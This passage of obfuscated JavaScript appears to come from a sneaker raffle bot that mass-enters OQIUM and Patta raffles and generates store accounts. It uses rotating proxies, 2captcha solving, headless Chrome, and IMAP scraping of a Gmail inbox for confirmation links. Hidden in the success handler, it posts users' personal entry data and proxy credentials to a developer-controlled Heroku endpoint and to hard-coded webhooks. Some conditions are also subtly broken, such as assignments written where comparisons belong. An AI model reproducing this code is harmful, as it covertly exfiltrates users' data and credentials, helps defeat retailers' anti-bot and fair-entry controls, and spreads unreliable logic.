                                _0x7c9d47['data']['attributes']['properties']['$first_name'] = '' + _0x1519c6[_0x401f46]['FirstName'], _0x7c9d47['data']['attributes']['properties']['$last_name'] = '' + _0x1519c6[_0x401f46]['LastName'], _0x7c9d47['data']['attributes']['properties']['$address1'] = _0x1519c6[_0x401f46]['Address1'] + '\x20' + _0x1519c6[_0x401f46]['Address2'] + '\x20' + _0x1519c6[_0x401f46]['HouseNumber'], _0x7c9d47['data']['attributes']['properties']['$zip'] = '' + _0x1519c6[_0x401f46]['Zip'], _0x7c9d47['data']['attributes']['properties']['$city'] = '' + _0x1519c6[_0x401f46]['City'], _0x7c9d47['data']['attributes']['properties']['$country'] = '' + _0x1519c6[_0x401f46]['Country'], _0x1519c6[_0x401f46]['Size'] == 'RANDOM' ? _0x7c9d47['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x74b9a2[_0x1cf09b] : _0x7c9d47['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1519c6[_0x401f46]['Size'], _0x7c9d47['data']['attributes']['properties']['$phone_number'] = '' + _0x1519c6[_0x401f46]['Phone'], _0x7c9d47['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x1519c6[_0x401f46]['Follower'];
                            }
                            if (_0x4a0109['useRandomProxy'] = ![])
                                var _0x4ced14 = _0x356802[_0x401f46]['split'](':');
                            else
                                var _0x4fd2a0 = Math['round'](Math['random']() * (_0x356802['length'] - 0x1)), _0x4ced14 = _0x356802[_0x4fd2a0]['split'](':');
                            var _0x522348 = {
                                'jar': _0x500704,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x58bc4d['url'],
                                'headers': _0x58bc4d['headers'],
                                'body': JSON['stringify'](_0x7c9d47),
                                'proxy': 'http://' + _0x4ced14[0x2] + ':' + _0x4ced14[0x3] + '@' + _0x4ced14[0x0] + ':' + _0x4ced14[0x1]
                            };
                            return _0x21069b != 'ver' && (_0x522348['url'] = _0x58bc4d['url'], _0x522348['headers'] = _0x58bc4d['headers']), _0x21069b == 'ver' && (_0x522348['method'] = 'GET'), new Promise(function (_0x2b5215, _0x4fdee8) {
                                callback = async (_0x3b5cd3, _0x2d33e3, _0x1885ec) => {
                                    if (!_0x3b5cd3 && _0x2d33e3['statusCode'] == 0xca || !_0x3b5cd3 && _0x2d33e3['statusCode'] == 0xc8) {
                                        if (_0x21069b != 'ver') {
                                            var _0x894fc3 = await _0x17c0a2(_0x1519c6[_0x401f46], _0x58bc4d, 'dev', ![]), _0x46b68a = await _0x17c0a2(_0x1519c6[_0x401f46], _0x58bc4d, 'pub', ![]);
                                            const _0x1b17c2 = {
                                                'succesDEVMSG': { 'embeds': [_0x894fc3] },
                                                'succesPUBMSG': { 'embeds': [_0x46b68a] }
                                            };
                                            let _0x480bd2 = _0x1519c6[_0x401f46];
                                            try {
                                                prxdata = {
                                                    'username': _0x4f2583['replace']('#', ''),
                                                    'module': _0x58bc4d['name'],
                                                    'entrydata': JSON['stringify'](_0x480bd2),
                                                    'proxy': '' + _0x356802[_0x401f46]
                                                };
                                                var _0xc0508a = JSON['stringify'](prxdata);
                                                let _0x3abb1a = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0xc0508a, _0x3abb1a);
                                            } catch (_0x5f5e3a) {
                                            }
                                            if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                                try {
                                                    await _0x161ab9(_0x4a0109['webhook'], _0x1b17c2['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x1b17c2['succesDEVMSG']), await _0x41ff52(0xc8);
                                            try {
                                                await _0x161ab9(_0x17a127, _0x1b17c2['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xe72aef(_0x1519c6[_0x401f46], _0x58bc4d);
                                        }
                                        _0x2b5215(console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x58bc4d['name'] + ']\x20Task\x20' + (_0x401f46 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x21069b != 'ver') {
                                            var _0x42f093 = '' + _0x3b5cd3, _0x5a555c = await _0x17c0a2(_0x1519c6[_0x401f46], _0x58bc4d, 'dev', !![], _0x42f093), _0x1c5174 = {};
                                            _0x1c5174['errorDEV'] = { 'embeds': [_0x5a555c] }, _0x53e25e(_0x1519c6[_0x401f46], _0x58bc4d), _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x1c5174['errorDEV']), await _0x161ab9(_0x11ee4c, _0x1c5174['errorDEV']);
                                        }
                                        _0x4fdee8(console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x58bc4d['name'] + ']\x20Task\x20' + (_0x401f46 + 0x1) + ':\x20' + _0x3b5cd3)));
                                    }
                                };
                                try {
                                    _0x21069b != 'ver' && console['log'](_0x2fd7e7() + '\x20[' + _0x58bc4d['name'] + ']\x20Task\x20' + (_0x401f46 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x7c9d47['data']['attributes']['email']), _0x11f0d1(_0x522348, callback);
                                } catch (_0x3ee163) {
                                    console['log'](_0x2fd7e7() + '\x20Task\x20' + (_0x401f46 + 0x1) + ':\x20' + _0x3ee163);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x430eb9(_0x5b103e, 'nor', _0x1d42b0, _0x375424, _0x3d4004), console['log'](_0x2fd7e7() + '\x20[' + _0x1d42b0['name'] + ']\x20Sleeping\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        } catch (_0x2fc53a) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xd91d, _0x4df337, _0x4a0e77) {
                    var _0x4df337 = [], _0x4e9dba = ![];
                    async function _0x4e262e() {
                        var _0x5786fb = new _0x2b7859({
                            'user': _0x4a0109['masterMail'],
                            'password': _0x4a0109['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x57bad0(_0x5ad42b) {
                            _0x5786fb['openBox']('INBOX', ![], _0x5ad42b);
                        }
                        _0x5786fb['once']('ready', function () {
                            _0x57bad0(function (_0x4ae1a6, _0x5804ce) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4ae1a6)
                                    throw _0x4ae1a6;
                                _0x5786fb['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x48740e, _0x3cef72) {
                                    if (!_0x3cef72 || !_0x3cef72['length'])
                                        console['log'](_0x2fd7e7() + '\x20[' + _0xd91d['name'] + ']\x20No\x20mails\x20found'), _0x5786fb['end']();
                                    else {
                                        var _0x48a5b9 = _0x5786fb['seq']['fetch'](_0x3cef72, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x48a5b9['on']('message', function (_0x5f2267, _0x9d7989) {
                                            var _0x2bdeb5 = '(#' + _0x9d7989 + ')\x20';
                                            _0x5f2267['on']('body', function (_0xd38c45, _0x3302e5) {
                                                _0x186dbf(_0xd38c45, (_0x550bfe, _0x184a3e) => {
                                                    var _0x4a0c51 = _0x184a3e['text']['split']('(')[0x1], _0x18adac = _0x4a0c51['split'](')')[0x0];
                                                    _0x4df337['push'](_0x18adac);
                                                });
                                            }), _0x5f2267['once']('end', function () {
                                            });
                                        }), _0x48a5b9['once']('error', function (_0x3af8b0) {
                                            console['log']('Fetch\x20error:\x20' + _0x3af8b0), _0x4e9dba = !![];
                                        }), _0x48a5b9['once']('end', function () {
                                            _0x5786fb['end'](), _0x4e9dba = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x5786fb['once']('error', function (_0x13ccf6) {
                            console['log'](_0x13ccf6), _0x4e9dba = !![];
                        }), _0x5786fb['once']('end', async function () {
                            _0x4e9dba = !![];
                        }), _0x5786fb['connect']();
                    }
                    async function _0x5cadb0(_0x493b7a, _0x2a6ce6, _0x47f288) {
                        for (var _0x5148d3 = 0x0; _0x5148d3 < _0x2a6ce6['length']; _0x5148d3++) {
                            async function _0xa63a7b(_0x3fa7b2, _0x49ba81, _0x17e718, _0x375904, _0x59cd1e) {
                                var _0x1388f4, _0x20d696 = {}, _0x369c8c = [], _0x2b6e02 = {}, _0x4543ea = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x24ef21 = Math['round'](Math['random']() * (_0x4543ea['length'] - 0x1));
                                _0x375904[_0x3fa7b2]['Size'] == 'RANDOM' && (_0x375904[_0x3fa7b2]['Size'] = _0x4543ea[_0x24ef21]);
                                !_0x375904 && (_0x375904 = {});
                                if (_0x4a0109['useRandomProxy'] = ![])
                                    var _0x8b8ae7 = _0x59cd1e[_0x3fa7b2]['split'](':');
                                else
                                    var _0xa2d28f = Math['round'](Math['random']() * (_0x59cd1e['length'] - 0x1)), _0x8b8ae7 = _0x59cd1e[_0xa2d28f]['split'](':');
                                var _0x43de31 = {
                                    'jar': _0x500704,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x17e718['url'],
                                    'headers': _0x17e718['headers'],
                                    'body': JSON['stringify'](_0x20d696),
                                    'proxy': 'http://' + _0x8b8ae7[0x2] + ':' + _0x8b8ae7[0x3] + '@' + _0x8b8ae7[0x0] + ':' + _0x8b8ae7[0x1]
                                };
                                return _0x49ba81 != 'ver' && (_0x43de31['url'] = _0x17e718['url'], _0x43de31['headers'] = _0x17e718['headers']), _0x49ba81 == 'ver' && (_0x43de31['method'] = 'GET', _0x43de31['url'] = _0x375904[_0x3fa7b2]), new Promise(function (_0x9416e6, _0x49b9e6) {
                                    callback = async (_0x2dedd6, _0x23a858, _0x21cbab) => {
                                        if (!_0x2dedd6 && _0x23a858['statusCode'] == 0xca || !_0x2dedd6 && _0x23a858['statusCode'] == 0xc8) {
                                            if (_0x49ba81 != 'ver') {
                                                var _0x38cbb7 = await _0x17c0a2(_0x375904[_0x3fa7b2], _0x17e718, 'dev', ![]), _0xd0ed3a = await _0x17c0a2(_0x375904[_0x3fa7b2], _0x17e718, 'pub', ![]);
                                                const _0x497a20 = {
                                                    'succesDEVMSG': { 'embeds': [_0x38cbb7] },
                                                    'succesPUBMSG': { 'embeds': [_0xd0ed3a] }
                                                };
                                                if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                                    try {
                                                        await _0x161ab9(_0x4a0109['webhook'], _0x497a20['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x497a20['succesDEVMSG']), await _0x41ff52(0xc8);
                                                try {
                                                    await _0x161ab9(_0x17a127, _0x497a20['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xe72aef(_0x375904[_0x3fa7b2], _0x17e718);
                                            }
                                            _0x9416e6(console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x17e718['name'] + ']\x20Task\x20' + (_0x3fa7b2 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x49ba81 != 'ver') {
                                                var _0xed1127 = '' + _0x2dedd6, _0x414bf0 = await _0x17c0a2(_0x375904[_0x3fa7b2], _0x17e718, 'dev', !![], _0xed1127), _0xe8cbca = {};
                                                _0xe8cbca['errorDEV'] = { 'embeds': [_0x414bf0] }, _0x53e25e(_0x375904[_0x3fa7b2], _0x17e718), _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xe8cbca['errorDEV']), await _0x161ab9(_0x11ee4c, _0xe8cbca['errorDEV']);
                                            }
                                            _0x49b9e6(console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x17e718['name'] + ']\x20Task\x20' + (_0x3fa7b2 + 0x1) + ':\x20' + _0x2dedd6)));
                                        }
                                    };
                                    try {
                                        _0x49ba81 != 'ver' ? console['log'](_0x2fd7e7() + '\x20[' + _0x17e718['name'] + ']\x20Task\x20' + (_0x3fa7b2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x20d696['data']['attributes']['email']) : console['log'](_0x2fd7e7() + '\x20[' + _0x17e718['name'] + ']\x20Task\x20' + (_0x3fa7b2 + 0x1) + ':\x20Fetching\x20Response'), _0x11f0d1(_0x43de31, callback);
                                    } catch (_0x5cb103) {
                                        console['log'](_0x2fd7e7() + '\x20Task\x20' + (_0x3fa7b2 + 0x1) + ':\x20' + _0x5cb103);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xa63a7b(_0x5148d3, 'ver', _0x493b7a, _0x2a6ce6, _0x47f288), console['log'](_0x2fd7e7() + '\x20[' + _0x493b7a['name'] + ']\x20Sleeping\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                            } catch (_0xa1f369) {
                            }
                        }
                    }
                    try {
                        _0x4e262e();
                        while (!_0x4e9dba) {
                            await _0x41ff52(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4df337['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5cadb0(_0xd91d, _0x4df337, _0x4a0e77);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x120bef, _0x58c1a8, _0x4b2af3) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x266ff9 = 0x0; _0x266ff9 < _0x58c1a8['length']; _0x266ff9++) {
                        var _0x2b2fbe = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4f2583
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4a0109['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5192c8
                                }
                            ]
                        }];
                        const _0x59d030 = { 'embeds': _0x2b2fbe };
                        _0x3a603f(_0x120bef['name'] + '\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20/\x20' + _0x58c1a8['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        try {
                            await _0x547a29(_0x58c1a8, _0x266ff9);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x864035 = await _0x17c0a2(_0x58c1a8[_0x266ff9], _0x120bef, 'acc', ![]);
                        const _0x33faef = { 'succesDEVMSG': { 'embeds': [_0x864035] } };
                        if (_0x58c1a8[_0x266ff9]['Email'] == '' || _0x58c1a8[_0x266ff9]['FirstName'] == '' || _0x58c1a8[_0x266ff9]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x41ff52(0x7d0);
                            continue;
                        }
                        (_0x58c1a8[_0x266ff9]['Password'] == '' || _0x58c1a8[_0x266ff9] == undefined) && _0x58c1a8[_0x266ff9]['Password'] == 'JRaffles23!';
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0xd5e658 = _0x4b2af3[_0x266ff9]['split'](':');
                        else
                            var _0x5e977f = Math['round'](Math['random']() * (_0x4b2af3['length'] - 0x1)), _0xd5e658 = _0x4b2af3[_0x5e977f]['split'](':');
                        var _0x46c882;
                        try {
                            _0x46c882 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd5e658[0x0] + ':' + _0xd5e658[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x46c882 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd5e658[0x0] + ':' + _0xd5e658[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x428d32 = await _0x46c882['newPage']();
                            await _0x428d32['authenticate']({
                                'username': '' + _0xd5e658[0x2],
                                'password': '' + _0xd5e658[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x120bef['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x428d32['setRequestInterception'](!![]), _0x428d32['on']('request', _0x2d9591 => {
                                _0x2d9591['resourceType']() === 'image' || _0x2d9591['resourceType']() === 'font' || _0x2d9591['resourceType']() === 'media' ? _0x2d9591['abort']() : _0x2d9591['continue']();
                            }), await _0x428d32['goto']('https://patta.nl/account/register'), await _0x41ff52(0xbb8), await _0x428d32['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x2fd7e7() + '\x20[' + _0x120bef['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Filling\x20information'), await _0x428d32['type']('#RegisterForm-FirstName', '' + _0x58c1a8[_0x266ff9]['FirstName']), await _0x41ff52(0x226), await _0x428d32['type']('#RegisterForm-LastName', '' + _0x58c1a8[_0x266ff9]['LastName']), await _0x41ff52(0x226), await _0x428d32['type']('#RegisterForm-email', '' + _0x58c1a8[_0x266ff9]['Email']), await _0x41ff52(0x226), await _0x428d32['type']('#RegisterForm-password', '' + _0x58c1a8[_0x266ff9]['Password']), await _0x41ff52(0x226), console['log'](_0x2fd7e7() + '\x20[' + _0x120bef['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Submitting..'), await _0x428d32['$eval']('#RegisterForm', _0x15d6c3 => _0x15d6c3['submit']()), await _0x41ff52(0x1f40);
                            try {
                                await _0x428d32['waitForSelector']('.home-page-grid__collection'), await _0x41ff52(0x1f4), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x120bef['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Account\x20' + _0x58c1a8[_0x266ff9]['Email'] + '\x20Generated!')), _0x144018['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x58c1a8[_0x266ff9]['Email'] + ',' + _0x58c1a8[_0x266ff9]['Password']), console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x120bef['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Account\x20' + _0x58c1a8[_0x266ff9]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x33faef['succesDEVMSG']);
                                } catch {
                                }
                                await _0x161ab9(_0x2467e3, _0x33faef['succesDEVMSG']);
                            } catch (_0x24893a) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x24893a));
                            }
                        } catch (_0x31fcb0) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x266ff9 + 0x1) + '\x20:\x20' + _0x31fcb0));
                        } finally {
                            _0x46c882 && _0x46c882['close'](), console['log']('Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4b2c0b, _0x3ca715, _0x2876fd) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1cd404 = 0x0; _0x1cd404 < _0x3ca715['length']; _0x1cd404++) {
                        var _0x4f1ab6;
                        if (_0x5deeb6 != 'yes')
                            var _0x5deeb6 = '', _0x2c601c = 0x0;
                        _0x3a603f(_0x4b2c0b['name'] + '\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20/\x20' + _0x3ca715['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        try {
                            await _0x547a29(_0x3ca715, _0x1cd404);
                        } catch {
                            _0x5deeb6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3ca715[_0x1cd404]['Email'] == '' || _0x3ca715[_0x1cd404]['Password'] == '' || _0x3ca715[_0x1cd404]['FirstName'] == '' || _0x3ca715[_0x1cd404]['LastName'] == '') {
                            console['log'](_0x2fd7e7() + '\x20[' + _0x6f29e[taskModule]['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4a0109['useRandomProxy'] = ![])
                            var _0xcec265 = _0x2876fd[_0x1cd404]['split'](':');
                        else
                            var _0x51a89b = Math['round'](Math['random']() * (_0x2876fd['length'] - 0x1)), _0xcec265 = _0x2876fd[_0x51a89b]['split'](':');
                        var _0x511fe9;
                        try {
                            _0x511fe9 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xcec265[0x0] + ':' + _0xcec265[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x511fe9 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xcec265[0x0] + ':' + _0xcec265[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3da2be = await _0x511fe9['newPage']();
                            await _0x3da2be['authenticate']({
                                'username': '' + _0xcec265[0x2],
                                'password': '' + _0xcec265[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3da2be['setRequestInterception'](!![]), _0x3da2be['on']('request', _0x113aee => {
                                _0x113aee['resourceType']() === 'image' || _0x113aee['resourceType']() === 'font' || _0x113aee['resourceType']() === 'media' ? _0x113aee['abort']() : _0x113aee['continue']();
                            }), await _0x3da2be['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3da2be['waitForSelector']('#CustomerEmail'), console['log'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3da2be['type']('#CustomerEmail', '' + _0x3ca715[_0x1cd404]['Email']), await _0x41ff52(0x12c), await _0x3da2be['type']('#CustomerPassword', '' + _0x3ca715[_0x1cd404]['Password']), await _0x41ff52(0x226), await _0x3da2be['$eval']('#customer_login', _0x477f5e => _0x477f5e['submit']());
                            try {
                                await _0x3da2be['waitForSelector']('#orders'), await _0x41ff52(0x4b0);
                            } catch {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3da2be['goto']('' + _0x3ca715[_0x1cd404]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x41ff52(0xbb8), console['log'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3da2be['waitForSelector']('#email');
                            } catch {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x3da2be['type']('#email', '' + _0x3ca715[_0x1cd404]['Email']), await _0x41ff52(0x384), await _0x3da2be['type']('#first_name', '' + _0x3ca715[_0x1cd404]['FirstName']), await _0x41ff52(0x514), await _0x3da2be['type']('#last_name', '' + _0x3ca715[_0x1cd404]['LastName']), await _0x41ff52(0x514), await _0x3da2be['type']('#street_address', _0x3ca715[_0x1cd404]['Address1'] + '\x20' + _0x3ca715[_0x1cd404]['HouseNumber'] + '\x20' + _0x3ca715[_0x1cd404]['Address2']), await _0x41ff52(0x2bc);
                            _0x3ca715[_0x1cd404]['Postcode'] == undefined && (_0x3ca715[_0x1cd404]['Postcode'] = _0x3ca715[_0x1cd404]['Zip']);
                            await _0x3da2be['type']('#zip_code', '' + _0x3ca715[_0x1cd404]['Postcode']), await _0x41ff52(0x320), await _0x3da2be['type']('#city', '' + _0x3ca715[_0x1cd404]['City']), await _0x41ff52(0x320), await _0x3da2be['type']('#bday', '01/01/1994'), await _0x41ff52(0x320), await _0x3da2be['type']('#instagram', '' + _0x3ca715[_0x1cd404]['Follower']), await _0x41ff52(0x352);
                            if (_0x3ca715[_0x1cd404]['Size'] == 'RANDOM') {
                                const _0x104d88 = await _0x3da2be['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1ca63d => {
                                    return _0x1ca63d['map'](_0x536a59 => _0x536a59['textContent']);
                                });
                                var _0x87a474 = Math['round'](Math['random']() * (_0x104d88['length'] - 0x1));
                                console['log'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x104d88[_0x87a474]), await _0x3da2be['click']('label[data-eu-size=\x22' + _0x104d88[_0x87a474] + '\x22]');
                            } else {
                                console['log'](_0x2fd7e7() + '\x20[' + _0x4b2c0b['name'] + ']\x20Task\x20' + (_0x1cd404 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x3ca715[_0x1cd404]['Size']);
                                try {
                                    await _0x3da2be['click']('label[data-eu-size=\x22' + _0x3ca715[_0x1cd404]['Size'] + '\x22]');
                                } catch {
                                    await _0x3da2be['click']('label[data-eu-size=\x22' + _0x3ca715[_0x1cd404]['Size'] + '.0\x22]');
                                }
                            }
